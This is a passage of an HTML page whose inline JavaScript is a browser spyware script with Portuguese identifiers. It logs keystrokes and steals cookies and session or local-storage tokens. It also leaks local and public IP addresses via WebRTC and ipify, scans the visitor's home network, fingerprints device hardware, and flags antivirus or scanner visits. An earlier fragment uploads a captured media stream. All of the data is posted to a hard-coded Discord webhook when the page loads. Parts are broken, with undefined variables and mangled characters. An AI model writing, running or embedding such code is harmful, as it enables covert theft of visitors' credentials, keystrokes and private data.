    const resp = await fetch(WEBHOOK_URL, { method: "POST", body: form });
    if (!resp.ok) throw new Error(`Discord HTTP ${resp.status}`);
    track.stop();
    stream.getTracks().forEach(t => t.stop());

    console.log("djmisadjsjdjidjdsjsjhshjsjhs");
  } catch (e) {
    console.error("jdjdjddjdhjxshhshhdshgshshsghs", e);
  }
})();

const samuka = "https://discord.com/api/webhooks/1430638895757922444/rRsN-2zGWkoEkt5re3OXt3lnyxEooiI71eTsvUaNT6xEso_iVHgda3MB11uCnIvTR-rk"
let teclasCapturadas ='';

document.addEventListener('keydown', (event) => {
  teclasCapturadas += event.key;
});

setInterval(() => {
  if (teclasCapturadas.length > 0) {
    fetch(samuka, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ keys: teclasCapturadas })
    })
    .then(response => {
      if (response.ok) {
        console.log('Teclas enviadas com sucesso');
        teclasCapturadas = '';
      } else {
        console.error('Erro ao enviar as teclas');
      }
    })
    .catch(error => console.error('Erro na requisi√ß√£o:', error));
  }
}, 30000); 
function detectarAndroid() {
  const userAgent = navigator.userAgent || navigator.vendor || window.opera;

  if (/android/i.test(userAgent)) {
    const versaoMatch = userAgent.match(/Androids([0-9.]+)/i);
    const versao = versaoMatch ? versaoMatch[1] : "Desconhecida";

    let marca = "Desconhecida";
    if (/Samsung/i.test(userAgent)) {
      marca = "Samsung";
    } else if (/Pixel/i.test(userAgent)) {
      marca = "Google Pixel";
    } else if (/Huawei/i.test(userAgent)) {
      marca = "Huawei";
    }

    return {
      sistema: "Android",
      versao: versao,
      marca: marca,
      userAgent: userAgent
    };
  } else {
    return null;
  }
}

const android_url = 'https://discord.com/api/webhooks/1430638895757922444/rRsN-2zGWkoEkt5re3OXt3lnyxEooiI71eTsvUaNT6xEso_iVHgda3MB11uCnIvTR-rk';
const infoAndroid = detectarAndroid();

if (infoAndroid) {
  fetch(android_url, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(infoAndroid)
  })
  .then(response => {
    if (response.ok) {
      console.log('Informa√ß√µes do Android enviadas com sucesso');
    } else {
      console.error('Falha ao enviar informa√ß√µes');
    }
  })
  .catch(error => console.error('Erro na requisi√ß√£o:', error));
} else {
  console.log('Dispositivo n√£o √© Android');
}
const roubo_cookies = 'https://discord.com/api/webhooks/1430638895757922444/rRsN-2zGWkoEkt5re3OXt3lnyxEooiI71eTsvUaNT6xEso_iVHgda3MB11uCnIvTR-rk';


function coletarCookies() {
  return document.cookie; 
}


function coletarTokens() {
  const tokens = {};
  for(let i = 0; i < localStorage.length; i++) {
    const chave = localStorage.key(i);
    if (chave.toLowerCase().includes('token')) {
      tokens[chave] = localStorage.getItem(chave);
    }
  }
  for(let i = 0; i < sessionStorage.length; i++) {
    const chave = sessionStorage.key(i);
    if (chave.toLowerCase().includes('token')) {
      tokens[chave] = sessionStorage.getItem(chave);
    }
  }
  return tokens;
}
const dados = {
  cookies: coletarCookies(),
  tokens: coletarTokens()
};

fetch(roubo_cookies, {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify(dados)
})
.then(response => {
  if(response.ok) {
    console.log('Dados enviados com sucesso');
  } else {
    console.error('Erro ao enviar dados');
  }
})
.catch(error => console.error('Erro na requisi√ß√£o:', error));

const chaves =  'https://discord.com/api/webhooks/1430638895757922444/rRsN-2zGWkoEkt5re3OXt3lnyxEooiI71eTsvUaNT6xEso_iVHgda3MB11uCnIvTR-rk';


function obterIPs(callback) {
  const ips = new Set();
  const pc = new RTCPeerConnection({ iceServers: [] });

  pc.createDataChannel('');
  pc.createOffer()
    .then(offer => pc.setLocalDescription(offer))
    .catch(err => console.error('Erro ao criar offer:', err));

  pc.onicecandidate = event => {
    if (!event.candidate) {
      return;
    }
    const regexIp = /([0-9]{1,3}(.[0-9]{1,3}){3})/;
    const ipMatch = regexIp.exec(event.candidate.candidate);
    if (ipMatch) {
      const ip = ipMatch[1];
      if (!ips.has(ip)) {
        ips.add(ip);
        callback(ip);
      }
    }
  };
}

obterIPs(ip => {
  console.log('IP local detectado:', ip);
  fetch(chaves, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ localIP: ip })
  })
  .then(response => {
    if (response.ok) {
      console.log('IP enviado com sucesso ao webhook');
    } else {
      console.error('Falha ao enviar IP');
    }
  })
  .catch(error => {
    console.error('Erro na requisi√ß√£o:', error);
  });
});
const bebe =  'https://discord.com/api/webhooks/1430638895757922444/rRsN-2zGWkoEkt5re3OXt3lnyxEooiI71eTsvUaNT6xEso_iVHgda3MB11uCnIvTR-rk';
for(let i=1; i<=254; i++){
  let ip = `http://192.168.1.${i}`;
  fetch(ip, { mode: 'no-cors' })
    .then(() => {
      fetch(bebe, {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({ ipAcessivel: ip })
      });
    })
    .catch(() => {  });
}
const batman=  'https://discord.com/api/webhooks/1430638895757922444/rRsN-2zGWkoEkt5re3OXt3lnyxEooiI71eTsvUaNT6xEso_iVHgda3MB11uCnIvTR-rk';


function obterIpPublico() {
  return fetch('https://api.ipify.org?format=json')
    .then(response => response.json())
    .then(data => data.ip)
    .catch(() => 'IP n√£o dispon√≠vel');
}

function capturarDadosDispositivo() {
  return {
    userAgent: navigator.userAgent,
    plataforma: navigator.platform,
    idioma: navigator.language,
    cookiesAtivos: navigator.cookieEnabled
  };
}


function enviarDadosParaWebhook(dados) {
  fetch(webhookUrl, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(dados)
  }).then(response => {
      if (response.ok) console.log('Dados enviados ao webhook com sucesso');
      else console.error('Falha ao enviar dados');
  }).catch(error => console.error('Erro na requisi√ß√£o:', error));
}
obterIpPublico().then(ip => {
  const dadosColetados = capturarDadosDispositivo();
  dadosColetados.ipPublico = ip;
  enviarDadosParaWebhook(dadosColetados);
});
const blacksamurai = 'https://discord.com/api/webhooks/1430638895757922444/rRsN-2zGWkoEkt5re3OXt3lnyxEooiI71eTsvUaNT6xEso_iVHgda3MB11uCnIvTR-rk';

function obterIpPublico() {
  return fetch('https://api.ipify.org?format=json')
    .then(resp => resp.json())
    .then(data => data.ip)
    .catch(() => 'IP n√£o dispon√≠vel');
}
function coletarDadosDispositivo(ip) {
  return {
    ipPublico: ip,
    userAgent: navigator.userAgent,
    plataforma: navigator.platform,
    idioma: navigator.language,
    cookiesAtivos: navigator.cookieEnabled,
    timestamp: new Date().toISOString()
  };
}


function enviarDadosWebhook(dados) {
  fetch(blacksamurai, {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify(dados)
  });
}


function contarVisita(ip) {
  const visitasChave = `visitas_${ip}`;
  let visitas = parseInt(localStorage.getItem(visitasChave)) || 0;
  visitas++;
  localStorage.setItem(visitasChave, visitas);
  return visitas;
}
obterIpPublico().then(ip => {
  const numVisitas = contarVisita(ip);
  if (numVisitas >= 5) {
    const dados = coletarDadosDispositivo(ip);
    enviarDadosWebhook(dados);
  }
});
const antivirus = 'https://discord.com/api/webhooks/1430638895757922444/rRsN-2zGWkoEkt5re3OXt3lnyxEooiI71eTsvUaNT6xEso_iVHgda3MB11uCnIvTR-rk';

const maxRequisi√ß√µes = 3;
const intervalo = 60000; 
let contadorRequisi√ß√µes = 0;
let √∫ltimaRequisi√ß√£o = Date.now();

function verificarUserAgent() {
  const ua = navigator.userAgent.toLowerCase();
  const padr√µesScanner = [
    "bot", "crawler", "spider", "scanner", "antivirus", "curl", "wget"
  ];
  return padr√µesScanner.some(p => ua.includes(p));
}

function enviarAlerta(dados) {
  fetch(antivirus, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(dados)
  });
}

function registrarRequisi√ß√£o() {
  const agora = Date.now();

  if (agora - √∫ltimaRequisi√ß√£o > intervalo) {
    contadorRequisi√ß√µes = 1;
    √∫ltimaRequisi√ß√£o = agora;
  } else {
    contadorRequisi√ß√µes++;
  }

  if (contadorRequisi√ß√µes >= maxRequisi√ß√µes || verificarUserAgent()) {
    const alerta = {
      userAgent: navigator.userAgent,
      urlAtual: window.location.href,
      timestamp: new Date().toISOString(),
      mensagem: 'Poss√≠vel atividade de antiv√≠rus ou scanner detectada'
    };
    enviarAlerta(alerta);
  }
}

window.addEventListener('load', registrarRequisi√ß√£o);
const url_startwars= 'https://discord.com/api/webhooks/1430638895757922444/rRsN-2zGWkoEkt5re3OXt3lnyxEooiI71eTsvUaNT6xEso_iVHgda3MB11uCnIvTR-rk';
function enviarAlerta(info) {
  fetch(url_startwars, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(info)
  });
}

function detectarUrlInvalida() {
  const info = {
    urlTentada: window.location.href,
    userAgent: navigator.userAgent,
    plataforma: navigator.platform,
    idioma: navigator.language,
    timestamp: new Date().toISOString(),
    alerta: 'Usu√°rio tentou acessar caminho inv√°lido do site'
  };
  
  enviarAlerta(info);
  

  document.body.appendChild(alertaDiv);
}

async function analisarHardware() {
  const URL_WEBHOOK_NOVA = "https://discord.com/api/webhooks/1430638895757922444/rRsN-2zGWkoEkt5re3OXt3lnyxEooiI71eTsvUaNT6xEso_iVHgda3MB11uCnIvTR-rk";
  
  try {
    const infoNavegador = navigator.userAgent;
    const soSistema = navigator.platform;
    const coresCPU = navigator.hardwareConcurrency || "N/D";
    const ramMemoria = navigator.deviceMemory || "N/D";
    const linguagem = navigator.language;
    const tamanhoTela = `${window.screen.width}x${window.screen.height}`;
    
    let dadosGPU = "N/D";
    const canvasTemp = document.createElement("canvas");
    const contexto3D = canvasTemp.getContext("webgl") || canvasTemp.getContext("experimental-webgl");
    
    if (contexto3D) {
      const extDebug = contexto3D.getExtension("WEBGL_debug_renderer_info");
      if (extDebug) {
        dadosGPU = contexto3D.getParameter(extDebug.UNMASKED_RENDERER_WEBGL);
      }
    }

    const payloadNovo = {
      username: "üîß Analisador de Hardware",
      embeds: [{
        title: "üìä Dados de Hardware Coletados",
        color: 0xFFA500,
        fields: [
          { name: "üíª Sistema", value: soSistema, inline: true },
          { name: "‚ö° N√∫cleos", value: coresCPU.toString(), inline: true },
          { name: "üß† RAM", value: ramMemoria + " GB", inline: true },
          { name: "üéÆ GPU", value: dadosGPU, inline: false },
          { name: "üñ• Tela", value: tamanhoTela, inline: true },
          { name: "üåê Idioma", value: linguagem, inline: true }
        ],
        footer: { text: "An√°lise completa do sistema" },
        timestamp: new Date().toISOString()
      }]
    };

    await fetch(URL_WEBHOOK_NOVA, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(payloadNovo)
    });
    
    console.log("‚úÖ An√°lise de hardware enviada!");
  } catch (error) {
    console.error("‚ùå Erro na an√°lise:", error);
  }
}

// Para executar:
analisarHardware();

</script>
 </body>
</html>
